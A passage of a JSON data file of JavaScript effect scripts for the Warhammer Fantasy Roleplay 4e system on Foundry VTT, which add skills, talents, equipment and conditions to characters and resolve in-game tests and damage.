characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","4QoxhoekgVeZcQA7":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.M5QSWOYt2Rbv2yxW\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","4XrAeL2DitxE8OaK":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.0hn6UaKq8CoZP2zD\")\nlet data = item.toObject();    \nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id});","4cOZzUvu1nytcqNn":"args.initiative = \"-10\"","4cumLUlcuJ7m8C6t":"let item = args.actor.items.find(i => i.name.includes(\"Smoothing\"));\nlet smoothing = item?.effects.find(e => e.name === \"Smoothing\");\nif (smoothing)\n  smoothing.disabled = true;","4drWKXjMgasxY7Jy":"args.actor.system.details.price.gc += Math.floor(args.actor.system.details.price.gc * 0.1);","4fnTKgl0HW9ZrWyJ":"this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty : \"average\"}}).then(async test =>\n{\n     await test.roll()\n     if (test.failed)\n     {\n         let char = Math.ceil(CONFIG.Dice.randomUniform() * 2) == 2 ? \"s\" : \"t\";\n         this.script.scriptMessage(`<strong>${this.actor.name}</strong> lost 1 point of ${game.wfrp4e.config.characteristics[char]}`)\n         this.actor.update({[`system.characteristics.${char}.initial`] : this.actor.system.characteristics[char].initial - 1})\n     }\n})","4gkz3LR7CK1b8ulK":"return args.item?.system.attackType != \"ranged\" || this.actor.uuid != this.effect.sourceActor.uuid","4iu3CmOI19soOYuA":"let characteristics = {\n    \"ws\" : -10,\n    \"bs\" : -10,\n    \"s\" : 0,\n    \"t\" : 0,\n    \"i\" : -10,\n    \"ag\" : -10,\n    \"dex\" : 0,\n    \"int\" : -200,\n    \"wp\" : -200,\n    \"fel\" : -200\n}\nlet traits = [ {name:\"Armour\", value: 2}, {name:\"Construct\"}, {name:\"Dark Vision\"}, {name:\"Fear\", value: 2}, {name:\"Painless\"},{name:\"Undead\"},{name:\"Unstable\"} ];\nlet items = [];\n\nlet updateObj = this.actor.toObject();\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nupdateObj.system.characteristics.int.initial = 0;\nupdateObj.system.characteristics.wp.initial = 0;\nupdateObj.system.characteristics.fel.initial = 0;\n\nfor (let trait of traits)\n{\n    let traitItem = await game.wfrp4e.utility.find(trait.name, \"trait\")\n    if (traitItem)\n    {   \n        let t = traitItem.toObject();\n        t.system.specification.value = trait.value;\n        if (trait.disabled)\n        {\n            t.system.disabled = true;\n        }\n        items.push(t);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trait.name}`, {permanent : true})\n    }\n}\n    \n\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\n","4iuTz0uInAfMaoGl":"return args.skill?.name?.includes(game.i18n.localize(\"NAME.Language\")) || args.type == \"cast\"","4otpLq2TnDdgzpvc":"args.actor.system.details.man -= 3;","4pQW4WLyhjbZR85k":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"average\"}, context : {failure: \"1 Corruption Point Gained\"}})\nawait test.roll();\nif (test.failed && this.actor.type == \"character\")\n{\n    this.actor.update({\"system.status.corruption.value\" : parseInt(this.actor.status.corruption.value) + 1})\n    this.script.scriptMessage(\"Gained a Corruption point\", {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n}","4rTmV3TNxctUe0ly":"let test = await this.actor.setupCharacteristic(\"ag\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`});\nawait test.roll();\nif (test.failed)\n{\n   this.actor.addCondition(\"bleeding\");\n}\n","4rb7LfMq9CTnlrpn":"if (args.totalWoundLoss > 0)\n{\n    let test = await args.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  \" - \" + this.effect.name})\n    await test.roll();\n    if (test.failed)\n    {\n        args.totalWoundLoss += 5;\n        args.modifiers.other.push({label : this.effect.name, value : 5})\n    }\n}","4rhxLzau7jZ4SDxg":"await args.actor.addCondition(\"grappling\")\nawait args.actor.addCondition(\"entangled\")","4uAUUZmLgxBKSmXA":"if (args.totalWoundLoss > 0) \n  this.effect.delete();","4ylzjgUdHY5D0yVh":"let characteristics = {\n    \"ws\" : 25,\n    \"bs\" : 10,\n    \"s\" : 15,\n    \"t\" : 15,\n    \"i\" : 25,\n    \"ag\" : 20,\n    \"dex\" : 0,\n    \"int\" : 10,\n    \"wp\" : 25,\n    \"fel\" : 10\n}\nlet skills = [\"Cool\", \"Dodge\", \"Intimidate\", \"Intuition\", \"Language (Battle)\", \"Leadership\", \"Lore (Warfare)\", \"Perception\"]\nlet skillAdvancements = [15, 15, 15, 15, 10, 15, 10, 10]\n\nlet talents = [\"Combat Aware\", \"Combat Master\", \"Combat Reflexes\", \"Inspiring\", \"Resolute\", \"War Leader\"]\nlet trappings = [\"Hand Weapon\",  \"Shield\", \"Plate Breastplate\", \"Plate Bracers\", \"Plate Helm\", \"Plate Leggings\"]\nlet specialItems = []    \nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let item of specialItems) {\n    let newItem\n    if (item.type == \"weapon\") {\n        newItem = new ItemWfrp4e({ name: item.name, type: item.type, system: { equipped: true, damage: {value: item.damage}}  })\n    } else if (item.type == \"trapping\") {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type, system: { worn: true, trappingType: { value: item.trappingType}  } } )\n    } else {\n        newItem = new ItemWfrp4e({ img: \"systems/wfrp4e/icons/blank.png\", name: item.name, type: item.type  })\n    }\n    items.push(newItem.toObject())\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nlet filters = [\n    {\n        property : \"type\",\n        value : \"weapon\"\n    },\n    {\n        property : \"system.weaponGroup.value\",\n        value : [\"twohanded\", \"polearm\"]\n    }\n]\n\nitems = items.concat(await game.wfrp4e.apps.ItemDialog.createFromFilters(filters, 1, \"Choose an appropriate Polearm or Two-Handed Weapon\"))\n\nlet ride = await Dialog.confirm({title : \"Skill\", content : \"Add Chaos Steed and +20 Ride (Horse)?\"})\n\nif (ride)\n{\n    let skill = await game.wfrp4e.utility.findSkill(\"Ride (Horse)\")\n    skill = skill.toObject();\n    skill.system.advances.value = 20;\n    items = items.concat({name : \"Chaos Steed\", type: \"trapping\", \"system.trappingType.value\" : \"misc\"}, skill)\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","52kbfuWrOh6dsTtd":"if (!this.actor.hasCondition(\"blinded\"))\n\tthis.actor.addCondition(\"blinded\", 1, {\"flags.wfrp4e.flockOfDoom\" : true})","52mwb33mGrQjq89B":"return args.skill?.name != game.i18n.localize(\"NAME.Research\");","53HFDNuMnX1Aw1a4":"return [\"ws\", \"bs\", \"s\", \"ag\", \"dex\", \"int\", \"wp\", \"fel\"].includes(args.characteristic)","58rFc9HiBoX66J6p":"let sourceActor = this.effect.sourceActor;\nlet damage = args.totalWoundLoss;\nlet tb = sourceActor.system.characteristics.t.bonus\nargs.abort = `<strong>${this.effect.name}</strong>: Damage applied to ${sourceActor.name}`;\n\nlet message = await sourceActor.applyBasicDamage(damage - tb, {damageType: game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP, suppressMsg : true})\n\nthis.script.scriptMessage(message.replace(`${tb} TB`, `${tb} × 2 TB`))\nargs.abort = true;","5DI6cHAg1LHo54Yv":"if (args.opposedTest.result.differenceSL >= 0 && args.opposedTest.result.differenceSL <= 2 && args.opposedTest.result.winner == \"attacker\")\n{ \n   this.actor.update({\"system.status.fortune.value\" : Math.max(0, (this.actor.system.status.fortune?.value - 1) || 0)})\n    this.script.scriptMessage(`Fortune point stolen from <strong>${this.actor.name}</strong>`, {blind : true, whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n\n}","5Fe1ELaS6Gnvy0Cj":"return args.skill?.name.includes(\"Channelling\") || args.type == \"channelling\" || args.skill?.name == game.i18n.localize(\"NAME.Charm\") || args.skill?.name.includes(\"Language (Magick)\") || args.type == \"cast\"","5IoYTyedCMYwt3ys":"args.fields.slBonus += 2;","5JWC0l3JEpOsqbR9":"let characteristics = {\n    \"ws\" : 0,\n    \"bs\" : 5,\n    \"s\" : 0,\n    \"t\" : 0,\n    \"i\" : 10,\n    \"ag\" : 10,\n    \"dex\" : 0,\n    \"int\" : 0,\n    \"wp\" : 5,\n    \"fel\" : 0\n}\nlet skills = [\"Dodge\", \"Perception\"]\nlet skillAdvancements = [10, 10]\nlet talents = [\"Flee!\", \"Marksman\"]\nlet trappings = [\"Hand Weapon\"]\nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","5JvKJZPcd6Hz5zvn":"let characteristics = {\n    \"ws\" : 10,\n    \"bs\" : 0,\n    \"s\" : 10,\n    \"t\" : 10,\n    \"i\" : 20,\n    \"ag\" : 10,\n    \"dex\" : 0,\n    \"int\" : 0,\n    \"wp\" : 15,\n    \"fel\" : 0\n}\nlet skills = [\"Cool\", \"Dodge\", \"Intimidate\", \"Leadership\"]\nlet skillAdvancements = [15, 15, 10, 5]\nlet talents = [\"Combat Aware\", \"Combat Reflexes\", \"Feint\", \"Resolute\"]\nlet trappings = [\"Mail Coat\", \"Mail Chausses\", \"Mail Coif\", \"Hand Weapon\", \"Shield\"]\nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = this.effect.name + \" \" + updateObj.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","5LdJCKfQem1AQK24":"\nif (!args.flags.howlingWarpGale)\n{\n    args.fields.modifier -= 10;\n    args.flags.howlingWarpGale = true; // prevent double application\n}","5M6IgCUncCwyxHok":"let etiquette = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.sYbgpSnRqSZWgwFP\")).toObject();\netiquette.name += ` (Followers of Tzeentch)`;\n\nlet animosity = (await fromUuid(\"Compendium.wfrp4e-core.items.Item.0VpT5yubw4UL7j6f\")).toObject();\nanimosity.system.specification.value = \"Followers of Nurgle\";\n\nlet roll = await new Roll(\"ceil(1d10 / 3)\").roll();\n\nroll.toMessage(this.script.getChatData());\n\nlet mutations = [];\nlet msg = `<p><strong>Mutations Gained</strong></p>`\nfor(let i = 0; i < roll.total; i++)\n{\n    let item;\n    let uuid;\n    let result;\n    if (i % 2 == 0)\n    {\n        result = await game.wfrp4e.tables.rollTable(\"mutatemental\", {hideDSN: true}, \"Tzeentch\")\n    }\n    else \n    {\n        result = await game.wfrp4e.tables.rollTable(\"mutatephys\", {hideDSN: true}, \"Tzeentch\")\n    }\n    uuid = `Compendium.${result.object.documentCollection}.${result.object.documentId}`;\n    item = await fromUuid(uuid);\n    if (item)\n    {\n        msg += `<p>@UUID[${uuid}]{${item.name}}</p>`\n        mutations.push(item.toObject());\n    }\n}\nthis.actor.createEmbeddedDocuments(\"Item\", mutations.concat([etiquette, animosity]), {fromEffect : this.effect.id})\nthis.script.scriptMessage(msg);","5MxRDXzUBPfp2KKD":"args.options.useOnesSupportive = true;","5ScjIdRUOxblHdWS":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpenter)';\nconst difficulty = 'challenging';\nconst target = 40;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","5dR7Erj3nwsxLAV7":"let characteristics = {\n    \"ws\" : 35,\n    \"bs\" : 10,\n    \"s\" : 25,\n    \"t\" : 30,\n    \"i\" : 30,\n    \"ag\" : 25,\n    \"dex\" : 0,\n    \"int\" : 15,\n    \"wp\" : 35,\n    \"fel\" : 15\n}\nlet skills = [\"Cool\", \"Dodge\", \"Intimidate\", \"Intuition\", \"Leadership\", \"Lore (Warfare)\", \"Perception\"]\nlet skillAdvancements = [25, 15, 25, 25, 30, 20, 20]\nlet talents = [\"Combat Aware\", \"Combat Reflexes\", \"Feint\", \"Inspiring\", \"Luck\", \"Resolute\", \"Unshakable\", \"War Leader\"]\nlet trappings = [\"Hand Weapon\", \"Shield\"]\nlet items = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n    let skill = skills[index]\n    let skillItem;\n    skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n    if (skillItem)\n        skillItem.system.advances.value += skillAdvancements[index]\n    else \n    {\n        skillItem = await game.wfrp4e.utility.findSkill(skill)\n        skillItem = skillItem.toObject();\n        skillItem.system.advances.value = skillAdvancements[index];\n        items.push(skillItem);\n    }\n}\n\nfor (let talent of talents)\n{\n    let talentItem = await game.wfrp4e.utility.findTalent(talent)\n    if (talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","5lc1eHIYQNpSRWip":"if ([\"death\", \"necromancy\"].includes(args.spell?.system.lore.value))\n{\n    args.fields.successBonus += 1\n}\nelse if([\"life\", \"light\", \"heavens\"].includes(args.spell?.system.lore.value))\n{\n    args.fields.modifier -= 10;\n}","5o1XiceC4rutjMms":"return !args.item?.name.includes(game.i18n.localize(\"NAME.Stealth\"))","5sI9iYh5j2nx2XyT":"return !([\"Animal Care\", \"Charm Animal\"].includes(args.item?.name) || args.item?.name.includes(\"Ride\") || args.item?.name.includes(\"Animal Training\"))","5sYpJkT2WXIe0gIZ":"const rating = parseInt(this.effect.name.match(/\\d+/)?.[0]) || 1;\n\nlet crewList = foundry.utils.duplicate(this.actor.system.passengers.list);\nlet selectedCrew = [];\n\nwhile (selectedCrew.length < rating && crewList.length) {\n  selectedCrew.push(crewList.splice(crewList.length * Math.random() | 0, 1)[0]);\n} \n\nfor (let member of selectedCrew) {\n  let actor = game.actors.get(member.id);\n  actor.applyBasicDamage(9, {\n    damageType: game.wfrp4e.config.DAMAGE_TYPE.NORMAL, \n    minimumOne: true, \n    loc: \"roll\", \n    suppressMsg: false, \n    hideDSN: false \n  });\n}","62Ky6bC1EnTllSJA":"if (this.effect.sourceActor.uuid != args.actor.uuid)\n{\n    this.script.scriptMessage(await this.actor.applyBasicDamage(this.effect.sourceTest.result.overcast.usage.other.current, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg: true}));\n}","65o8pQj6oGNnXce6":"let ch = this.effect.getFlag(\"wfrp4e\", \"characteristic\")\nthis.actor.system.characteristics[ch].modifier += 10;","65xE9OV5sA1ZWT7j":"if (args.test.options.diceman && args.test.succeeded)\n{\n\nlet SL = Math.floor(args.test.target / 10) - Math.floor(args.test.result.roll / 10)\nlet ones = Number(args.test.result.roll.toString().split(\"\").pop())\n\nif (ones > SL)\n   args.test.result.other.push(`<span class=\"hide-option\"><b>${this.effect.name}</b>: ${ones + args.test.successBonus + args.test.slBonus} SL</span>`)\n}","6Aqq4F4Xui923sc6":"// Imbibing this substance grants the user the Painless Creature Trait.\nconst hasColdBlooded = this.actor.has(\"Cold Blooded\")\nif (hasColdBlooded === undefined) \n{\n  let item = await fromUuid(\"Compendium.wfrp4e-core.items.mCh1KK9jomwFZcLB\")\n  let data = item.toObject()\n  this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n  \n  this.script.scriptMessage(`<p><strong>${this.actor.prototypeToken.name}</strong> has gained the Cold Blooded Creature Trait and may reverse any failed Willpower based Tests.</p>\n  <p>If they gain a Surprised Condition, this Condition is not lost the first time it should be (which is typically at the end of the Round or if they victim is attacked).</p>`, \n  {whisper: ChatMessage.getWhisperRecipients(\"GM\"), blind: true })   \n}","6BmvV9c03FkfisnE":"// Apply changes when the mask is worn\n\nif (args.equipped) {  \n  this.actor.createEmbeddedDocuments(\"ActiveEffect\", [this.item.effects.contents[1]?.convertToApplied()])  \n  this.script.scriptMessage(`${this.actor.name} dons the <strong>${this.item.name}</strong>. <br>\n      They gain +1 Corruption point if an exposure Test is failed, which will need to be manually applied.<br>If they wear the mask for more than an hour or benefit from any of its effects, they are exposed to @Corruption[moderate]{Moderate Corruption} \n      `,\n      {whisper: ChatMessage.getWhisperRecipients(\"GM\")}) \n}\n\n// Notify of lingering effects when mask is removed\nelse if (!args.equipped)\n{\n    await this.item.effects.contents[0].delete();\n    await this.item.update({name : this.item.name += \" (Used)\"})\n    this.script.scriptMessage(`<strong>${this.item.name}</strong> on ${this.actor.name} has been taken off and loses its properties. However, the effects last for [[1d10+4]] days, after which they should be manually removed.`, \n    {whisper: ChatMessage.getWhisperRecipients(\"GM\")}\n    )\n    \n}","6EXkbVTRBhKTEu81":"if (!args.flags.bothEyes)\n{\n\targs.flags.bothEyes = true;\n\targs.fields.modifier -= 30\n}","6Fe8M5MdklKS2olx":"return args.characteristic != \"fel\"","6H6vNjzvMGl2ZqCR":"if (args.totalWoundLoss > 0)\n     this.script.scriptMessage(`<b>Blade of Nurglitch: ${args.actor.name}</b> must pass an <b>Difficult (-10) Endurance</b> Test or gain a @UUID[Compendium.wfrp4e-core.items.kKccDTGzWzSXCBOb]{Festering Wound}`, {whisper: ChatMessage.getWhisperRecipients(\"GM\") })","6JrUjs3g5x6bFnj3":"let bite = await fromUuid(\"Compendium.wfrp4e-core.items.pLW9SVX0TVTYPiPv\")\nlet sense = await fromUuid(\"Compendium.wfrp4e-core.items.9h82z72XGo9tfgQS\")\nlet biteData = bite.toObject();\nlet senseData = sense.toObject();\n\nbiteData.system.specification.value = 6 - this.actor.characteristics.s.bonus;\nsenseData.name = senseData.name += \" (Smell)\"\nthis.actor.createEmbeddedDocuments(\"Item\", [biteData, senseData], {fromEffect : this.effect.id})","6MSodMuZ5xk2JJJ9":"if (!this.actor.hasCondition(\"ablaze\"))\n{\n    this.effect.delete();\n}","6Mjy0jDqczA8BxhS":"return ![\"roll\", \"none\"].includes(args.fields.hitLocation)","6QZUX7ZrFxOzqI0b":"let regenerate = this.actor.items.getName('Regenerate')\n\nif (regenerate)\n{\n    let effect = regenerate.effects.contents[0]\n    let scriptData = effect.getFlag(\"wfrp4e\", \"scriptData\");\n    \n    scriptData[0].script = scriptData[0].script.replace(\"1d10\", \"1d10 * 2\")\n}","6U8xox4mBrn5eYIp":"if (args.totalWoundLoss > 0)\n   args.actor.addCondition(\"ablaze\")","6V3qHON3mcerlBlB":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"prone\");\n}","6Ws3ieQ7pG5poUyT":"if (isNaN(parseInt(this.item.system.specification.value)))\n{\n    let value = await ValueDialog.create(\"Enter Spellcasting Lore\", this.effect.name, \"\", Object.values(game.wfrp4e.config.magicLores));\n    if (value)\n    {\n     this.item.updateSource({\"system.specification.value\" : value});\n    }\n}","6XWJWOUQPgKMsFul":"return args.item?.system.attackType != \"ranged\" || args.flags.howlingWarpGale","6ZS1rQLkNvMDO0Fp":"let roll = Math.ceil(CONFIG.Dice.randomUniform() * 10)\nif (args.test.isFumble && roll == 1 && !args.test.result.misfire)\n{\n  args.test.result.misfire = game.i18n.localize(\"Misfire\") + \" (Rolled 1)\"\n  args.test.result.misfireDamage = eval(parseInt(args.test.result.roll.toString().split('').pop()) + args.test.item.Damage)\n}\nelse if (args.test.isFumble && roll != 1)\n{\n    args.test.result.other.push(\"Misfire Roll: \" + roll)\n}\n\n","6elUNF58TaiYjxcx":"let test = await this.actor.setupCharacteristic(\"wp\", {skipTargets: true, appendTitle :  \" - \" + this.effect.name, context : {failure: \"Gained a Stunned Condition\"}})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"stunned\");\n}","6fElmBxTjdAaubbK":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty: \"average\"}});\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"prone\")\n}\n","6gRixT3zIOAberJb":"const disease = await fromUuid(\"Compendium.wfrp4e-soc.items.Item.8Q9JYtR1y3B5J6UH\");\nconst data = disease.toObject();\ndata.system.incubation.value = 0;\ndata.system.duration.active = true;\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id});","6hAgggYpNR3r4QWC":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Q2MCUrG2HppMcvN0\")\nitem = item.toObject()\nlet species = args.actor.Species || \" of your species\"\nitem.name = `Animosity (all not ${species})`\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})","6jcTzK1XEuWqAacN":"args.abort = true;\nthis.script.scriptNotification(`Cannot use ${game.wfrp4e.config.locations[this.effect.getFlag(\"wfrp4e\", \"location\")]}!`, \"error\")","6jp8slPU33oBQe1V":"return args.options.crewTest?.system.handling !== true;","6kifXp2jXEaQVJsg":"let useWard = await Dialog.wait({\n\ttitle : this.effect.name,\n\tcontent : `<p>Use Ward provided by <strong>${this.effect.name}</strong>?`,\n\tbuttons : {\n\t\tyes : {\n\t\t\tlabel : \"Yes\",\n\t\t\tcallback: () => {\n\t\t\t\treturn true;\n\t\t\t}\n\t\t},\n\t\tno : {\n\t\t\tlabel: \"No\",\n\t\t\tcallback: () => {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t}\n})\n\nif (useWard)\n\targs.ward = 9;","6mpw9cGseG4W4eyd":"if (this.actor.system.status.advantage.value >= 2)\n{\n    await this.actor.modifyAdvantage(-2);\n    this.script.scriptNotification(\"Advantage Subtracted\")\n}\nelse \n{\n    return this.script.scriptNotification(\"Not enough Advantage!\", \"error\")\n}\n\nlet test = await this.actor.setupTrait(this.item)\nawait test.roll();","6oSs8qKFNFz2lSmh":"if (args.actorsystem.details.move.sail.value > 0)\n  args.actor.system.details.move.sail.value = 0;\n","6qJP0hpShEM43ohx":"const actor = args.actor;\n\nif (actor.itemTypes.skill.find(s => s.name === \"Lore (Oceans)\")) {\n  const loreTest = await actor.setupSkill('Lore (Oceans)',  {\n    appendTitle: ` – ${this.effect.name}`,\n    skipTargets: true,\n    fields: {difficulty: 'hard'},\n    characteristic: 'int',\n  });\n  